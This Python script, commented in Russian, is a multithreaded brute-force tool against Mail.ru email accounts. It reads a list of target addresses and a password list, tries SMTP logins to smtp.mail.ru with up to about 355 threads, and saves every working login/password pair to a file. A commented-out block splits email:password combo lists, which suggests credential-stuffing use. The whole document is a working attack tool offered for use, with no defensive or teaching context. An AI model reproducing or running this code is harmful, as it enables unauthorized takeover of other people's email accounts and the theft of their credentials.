import smtplib
import threading
import time

passCount=-1
passTrue=0

passwordDict = open ('MailruPass.txt')
word = [line.strip(' \t\n\r') for line in passwordDict]
print ("Всего паролей :", len(word))
passwordDict.close()

def brutThreadingStart(login=False):
	global  passCount
	if passCount >= len(word) : return 0	
	passCount = passCount + 1
	#str = passwordDict.readline().strip(' \t\n\r')	
	threading.Thread(target = brut , args = ( login, word[passCount], passCount )).start()

def brut(login, password, passCountLocal= False):	
	global passCount, passTrue
		
	smtpObj = smtplib.SMTP('smtp.mail.ru')
	smtpObj.starttls()
	
	try :
		smtpObj.login(login, password)
	except:
		#if _FIND != 'ON': return 0
		print ("#", passCountLocal, "\tНЕ верный пароль :",  login, "->", password)
		smtpObj.quit()
		brutThreadingStart(login)
		return 0
	#Если пароль верный
	print ("#", passCountLocal, "\t!!! Верный пароль: ", password,"для :", login)
	f=open ('password_valid.txt','a')
	f.write(login +" -> " +  password + "\n")
	f.close	
	smtpObj.quit()
	passCount = len(word)	

#Тело скрипта
f = open('MailruLogin.txt')
email = [line.strip(' \t\n\r') for line in f]
print ("Всего email:", len(email))
f.close()

j=-1
while j <= len(email) :	
	j=j+1
	print ("Цель ->", email[j])		
	while True:		
		i = threading.active_count()
		while i+1 < 355: #количество потоков
			if passCount  >= len(word) : break
			i= threading.active_count()			
			brutThreadingStart(email[j])
			time.sleep(0.01)
		time.sleep(3); 
		print ("Активных потоков:", threading.active_count() )	
		if passCount  >= len(word) and threading.active_count() <2 : break
	passCount=-1
"""
f = open('passMailru.txt','w')
f2 = open('emailMailru.txt','w')
for line in passwordDict:
	str = line.strip(' \t\n\r').split(":")
	print (str)
	f2.write(str[0]+'\n')
	f.write(str[1]+'\n')
f.close()
f2.close()	
"""

#smtpObj.sendmail('Razor-men@mail.ru',"razor-men@mail.ru","go to bed!")

